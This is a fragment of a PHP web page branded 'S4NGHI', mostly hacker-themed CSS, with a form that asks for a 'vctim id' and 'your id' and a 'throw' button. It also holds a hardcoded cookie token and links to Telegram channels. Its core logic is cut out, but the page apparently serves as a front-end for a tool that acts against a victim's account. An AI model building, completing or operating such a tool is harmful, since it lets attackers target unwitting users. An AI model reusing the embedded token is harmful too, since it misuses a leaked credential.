...
<style type='text/css'>body{height: auto;width: auto;color: #0d022b;font-family:Bree Serif;text-align:center;padding:10px;margin-top:2%;background-color:#0d022b;color:#1aefca;letter-spacing:1.5px;}hr{border:0;height:2px;text-align: center;background-image:linear-gradient(to right,rgba(0,0,0,0),rgba(0,255,0,1),rgba(0,0,0,0));}h1{color:#1aefca;}form{margin:2% auto;padding:5px;max-width:580px;text-align:center;}.text{font-size:16px;color:#fa0202;outline:0;border-radius:5px;background-color: #0d022b;position:relative;font-family:Bree Serif;text-align:center;padding:8px 15px;height:30px;border:solid 1px #0011ff;margin-bottom:15px;box-shadow:10px 10px 20px rgba(0,0,0,0.1);width:90%;}.text:hover{border:solid 1px #FF0000;}.submit{font-size:16px;color:#80FF80;position:relative;background:#0d022b;outline:0;border-radius:5px;font-family:Bree Serif;text-align:center;padding:8px 15px;height:45px;border:solid 1px #0011ff;margin-bottom:10%;box-shadow:10px 10px 20px rgba(0,0,0,0.1);width:50%;}.submit:hover{background:#000000;color:#FF0000;border:solid 1px #FF0000;}h3{color:#00FF00;padding:5px 0;}strong{color:orange;}marquee{color:#00FF00;font-size: 20px;text-align: center;font-weight:bold;}balance{color:#00FF00;font-size: 20px;text-align: center;font-weight:bold;}gzp{color:#00FF00;font-size: 20px;text-align: center;font-weight:bold;margin-top:10%;}#loader { border: 12px solid #00FF00; border-radius: 50%; border-top: 12px solid #595959; width: 100px; height: 100px;text-align: center;animation: spin 1s linear infinite; } @keyframes spin { 100% { transform: rotate(360deg); } } .center { position: absolute; top: 0; bottom: 0; left: 0; right: 0; margin: auto; }a{text-decoration:none;color:#00FF00;}a:hover{color:#FF0000;}::placeholder { color: #80FF80; font-size:16px;}audio{ display:none;}</style>

</head>
<body>
     <?php
error_reporting(0);
echo "<font color='Red' size='5'><bold><hr class='hr-19'>S4NGHI<hr class='hr-19'><bold>";
...
'cookie:  token=5641578460:AAHrUdB5dVMtfuMdqFeJLVwLlMiBqvuHVYI',];
...
<input type='text' name='oid'  class='text' placeholder='vctim id' required><br><br>
<input type='text' name='uid'  class='text' placeholder='your id' required><br><br>";
echo "<input type='submit' class='submit' name='submit' value='throw'>";
	}

?>
      <script type="text/javascript"> var arrgetbtn=[]; arrgetbtn.push({"title":"","icon":"fwidgethelp-telegram_v2","link":"https://t.me/s4nghi","target":"_blank","color":"#FFFFFF","background":"#27A5E7"}); arrgetbtn.push({"title":"","icon":"fwidgethelp-telegram_v2","link":"https://t.me/s4nghi","target":"_blank","color":"#FFFFFF","background":"#cc0000"}); arrgetbtn.push({"title":"fwidgethelp-telegram_v2","icon":"fwidgethelp-telegram_v2","link":"https://t.me/chitrakoot_bot","target":"_blank","color":"#FFFFFF","background":"#ff00e6"}); var WidGetButtonOptions = { id:"99d94b6d33562f7f07911780e8c72119", iconopen:"fwidgethelp-telegram_v2", maintitle:"Telegram", mainbackground:"#ff0000", maincolor:"hsv(0, 0%, 100%)", pulse:"widgethelp_pulse", fasize:"1.75", direction:"top", position:"rightbottom", arrbtn: arrgetbtn }; (function() { var script = document.createElement("script"); script.type = "text/javascript"; script.async = true; script.src = "https://getbtn.com/widget/index.php?id="+WidGetButtonOptions.id; document.getElementsByTagName("head")[0].appendChild(script); })();</script>
